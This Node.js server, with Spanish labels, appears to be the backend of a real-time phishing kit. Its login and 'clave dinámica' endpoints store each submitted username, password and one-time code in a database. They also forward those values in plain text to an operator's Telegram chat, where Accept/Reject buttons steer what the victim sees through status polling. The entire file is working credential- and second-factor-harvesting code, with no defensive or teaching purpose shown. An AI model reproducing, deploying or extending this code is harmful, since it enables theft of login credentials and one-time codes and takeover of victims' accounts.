require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const TelegramBot = require('node-telegram-bot-api'); // 🔥 Importación directa
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors()); 

const pool = new Pool({
    connectionString: process.env.DATABASE_URL, 
    ssl: { rejectUnauthorized: false } 
});

const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

let bot = null;
if (TELEGRAM_TOKEN && CHAT_ID) {
    bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });
} else {
    console.error("❌ Faltan las variables de entorno TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID.");
}

const BACKEND_URL = process.env.BACKEND_URL || 'https://backkkk-rj54.onrender.com';

async function registrarWebhook() {
    if (!bot) return;
    try {
        const url = `${BACKEND_URL}/webhook/telegram`;
        await bot.setWebHook(url);
        console.log(`✅ Webhook registrado en: ${url}`);
    } catch (error) {
        console.error("❌ Error al registrar webhook:", error.message);
    }
}
registrarWebhook();

app.post('/api/login', async (req, res) => {
    const { usuario, clave } = req.body;
    if (!bot) return res.status(500).json({ success: false, message: "Bot no configurado" });

    try {
        const query = `INSERT INTO intentos_login (usuario, clave, estado, fecha) VALUES ($1, $2, 'pendiente', NOW()) RETURNING id;`;
        const result = await pool.query(query, [usuario, clave]);
        const intentoId = result.rows[0].id;

        const mensaje = `🚨 *Nuevo Intento de Login*\n\n👤 *Usuario:* ${usuario}\n🔑 *Clave:* ${clave}\n\n¿Aprobar acceso?`;
        
        const msg = await bot.sendMessage(CHAT_ID, mensaje, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Aceptar', callback_data: `accept_${intentoId}` },
                    { text: '❌ Rechazar', callback_data: `reject_${intentoId}` }
                ]]
            }
        });

        await pool.query('UPDATE intentos_login SET mensaje_telegram_id = $1 WHERE id = $2', [msg.message_id, intentoId]);
        res.json({ success: true, intentoId: intentoId });
    } catch (error) {
        console.error("Error en login:", error);
        res.status(500).json({ success: false, message: "Error en el servidor" });
    }
});

app.get('/api/status/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const result = await pool.query('SELECT estado FROM intentos_login WHERE id = $1', [id]);
        if (result.rows.length === 0) return res.status(404).json({ estado: 'no_encontrado' });
        res.json({ estado: result.rows[0].estado }); 
    } catch (error) {
        res.status(500).json({ error: 'Error de BD' });
    }
});

app.post('/api/dinamica', async (req, res) => {
    const { usuario, clave, claveDinamica } = req.body;
    if (!bot) return res.status(500).json({ success: false, message: "Bot no configurado" });

    try {
        const query = `INSERT INTO intentos_dinamica (usuario, clave, clave_dinamica, estado, fecha) VALUES ($1, $2, $3, 'pendiente', NOW()) RETURNING id;`;
        const result = await pool.query(query, [usuario, clave, claveDinamica]);
        const intentoId = result.rows[0].id;

        const mensaje = `🔐 *Clave Dinámica Recibida*\n\n👤 *Usuario:* ${usuario}\n🔑 *Clave:* ${clave}\n🔢 *Dinámica:* ${claveDinamica}\n\n¿Qué deseas hacer?`;
        
        const msg = await bot.sendMessage(CHAT_ID, mensaje, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Aprobar Dinámica', callback_data: `accept_dinamica_${intentoId}` },
                    { text: '❌ Error Dinámica', callback_data: `reject_dinamica_${intentoId}` }
                ]]
            }
        });

        await pool.query('UPDATE intentos_dinamica SET mensaje_telegram_id = $1 WHERE id = $2', [msg.message_id, intentoId]);
        res.json({ success: true, intentoId: intentoId });
    } catch (error) {
        console.error("Error en /api/dinamica:", error);
        res.status(500).json({ success: false, message: "Error en el servidor" });
    }
});

app.get('/api/status-dinamica/:id', async (req, res) => {
    try {
        const { id } = req.params;
        const result = await pool.query('SELECT estado FROM intentos_dinamica WHERE id = $1', [id]);
        if (result.rows.length === 0) return res.status(404).json({ estado: 'no_encontrado' });
        res.json({ estado: result.rows[0].estado }); 
    } catch (error) {
        res.status(500).json({ error: 'Error de BD' });
    }
});

app.post(`/webhook/telegram`, async (req, res) => {
    const callbackQuery = req.body.callback_query;
    if (callbackQuery && bot) {
        const data = callbackQuery.data; 
        const chatId = callbackQuery.message.chat.id;
        const messageId = callbackQuery.message.message_id;
        
        const parts = data.split('_');
        const accion = parts[0]; 
        const tipo = parts.length > 2 ? parts[1] : 'login'; 
        const id = parts.length > 2 ? parts[2] : parts[1];

        try {
            let nuevoEstado = accion === 'accept' ? 'aceptado' : 'rechazado';
            
            if (tipo === 'dinamica') {
                await pool.query('UPDATE intentos_dinamica SET estado = $1 WHERE id = $2', [nuevoEstado, id]);
            } else {
                await pool.query('UPDATE intentos_login SET estado = $1 WHERE id = $2', [nuevoEstado, id]);
            }

            let textoOriginal = callbackQuery.message.text;
            let textoActualizado = `${textoOriginal}\n\n---\n${nuevoEstado === 'aceptado' ? '✅ *ACEPTADO*' : '❌ *RECHAZADO*'}`;
            
            await bot.editMessageText(textoActualizado, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [] } 
            });

            await bot.answerCallbackQuery(callbackQuery.id, { text: `Estado: ${nuevoEstado}` });
        } catch (error) {
            console.error("Error procesando webhook:", error);
            bot.answerCallbackQuery(callbackQuery.id, { text: "Este intento ya fue procesado o expiró." }).catch(()=>{});
        }
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Backend corriendo en puerto ${PORT}`);
});
